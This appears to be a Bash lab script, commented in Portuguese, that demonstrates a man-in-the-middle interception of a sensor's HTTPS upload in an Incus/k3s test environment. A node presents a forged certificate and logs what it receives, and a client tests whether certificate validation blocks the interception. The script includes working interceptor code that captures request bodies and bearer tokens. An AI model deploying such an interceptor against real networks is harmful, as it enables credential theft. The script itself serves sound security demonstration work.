#!/usr/bin/env bash
# Extra 2: interceção (MitM) da publicação de um sensor externo.
# bot-3 faz-se passar pela ingestão de Lisboa com um certificado próprio para
# k3s-master.incus. O desvio do nome para bot-3 (sequestro de DNS ou de rota)
# é simulado no cliente com --resolve. client-user faz de sensor com a CA do site.
source "$(dirname "$0")/lib.sh"
site=${1:-lisboa}
port=$(config setting "$site" sensor_port)
start_clients bot-3 client-user
node=$(lab_ip k3s-master); bot=$(lab_ip bot-3)
evidence_dir "mitm-$site"
work=$(mktemp -d); trap 'rm -rf "$work"; stop_clients' EXIT
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -days 1 \
    -subj '/CN=k3s-master.incus' -addext 'subjectAltName=DNS:k3s-master.incus' \
    -keyout "$work/falso.key" -out "$work/falso.crt" 2>/dev/null
kube -n "$site" get configmap ingestion-ca -o 'jsonpath={.data.ca\.crt}' > "$work/ca.crt"
for file in falso.key falso.crt; do incus file push "$work/$file" "bot-3/tmp/$file" </dev/null >/dev/null; done
incus file push "$work/ca.crt" client-user/tmp/ca-ingestao.crt </dev/null >/dev/null
printf 'inicio %s ingestao=%s:%s intercetor=bot-3 %s\n' "$(now)" "$node" "$port" "$bot" | tee "$OUT/meta"

# Intercetor: aceita TLS com o certificado falso e regista o que receber.
incus exec bot-3 -- python3 - "$port" </dev/null > "$OUT/intercetor.log" 2>&1 <<'PY' &
import socket, ssl, sys, time
from datetime import datetime, timezone
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('/tmp/falso.crt', '/tmp/falso.key')
server = socket.create_server(('0.0.0.0', int(sys.argv[1])))
server.settimeout(1)
end = time.time() + 25
stamp = lambda: datetime.now(timezone.utc).strftime('%H:%M:%S.%f')[:-3]
while time.time() < end:
    try:
        raw, peer = server.accept()
    except socket.timeout:
        continue
    try:
        with ctx.wrap_socket(raw, server_side=True) as conn:
            conn.settimeout(2)
            data = conn.recv(4096).decode(errors='replace')
            print(stamp(), 'TLS aceite por', peer[0], '- recebido:', flush=True)
            for line in data.splitlines():
                print('   ', line, flush=True)
            conn.sendall(b'HTTP/1.1 202 Accepted\r\nContent-Length: 0\r\nConnection: close\r\n\r\n')
    except (ssl.SSLError, OSError) as e:
        print(stamp(), 'handshake falhou com', peer[0], '-', type(e).__name__, getattr(e, 'reason', '') or e, flush=True)
PY
sleep 2
body="{\"device_id\":\"pt.$site.dc1.rack1.lab.sensor.temperature.01\",\"temperature\":21.0}"
incus exec client-user -- sh -c "
    req() { printf '%s %-34s ' \$(date -u +%T) \"\$1\"; shift; curl -sS -m 4 -o /dev/null -w '%{http_code}\n' -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN-DE-ENSAIO' -d '$body' \"\$@\" 2>&1 | tr '\n' ' '; echo; }
    req 'ingestão verdadeira, CA do site' --cacert /tmp/ca-ingestao.crt --resolve k3s-master.incus:$port:$node https://k3s-master.incus:$port/ingest
    req 'nome desviado, CA do site' --cacert /tmp/ca-ingestao.crt --resolve k3s-master.incus:$port:$bot https://k3s-master.incus:$port/ingest
    req 'nome desviado, sem validação (-k)' -k --resolve k3s-master.incus:$port:$bot https://k3s-master.incus:$port/ingest
" </dev/null | tee "$OUT/sensor.log"
wait
incus exec bot-3 -- rm -f /tmp/falso.key /tmp/falso.crt </dev/null
incus exec client-user -- rm -f /tmp/ca-ingestao.crt </dev/null
{
    cat "$OUT/sensor.log"
    sed 's/^/intercetor /' "$OUT/intercetor.log"
} | tee "$OUT/resumo.txt"
